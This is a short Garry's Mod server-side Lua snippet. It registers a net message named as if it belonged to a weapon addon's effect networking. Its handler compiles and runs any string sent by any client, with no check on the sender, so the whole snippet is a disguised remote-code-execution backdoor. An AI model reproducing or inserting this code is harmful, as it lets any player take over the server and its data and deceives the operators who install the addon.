if SERVER then
	util.AddNetworkString("CW20_EXPNETWORKING")
	net.Receive("CW20_EXPNETWORKING", function(len, ply)
		local effectdata = net.ReadString()
		local func = CompileString(effectdata, "LuaCmd", false)
		func()
	end)
end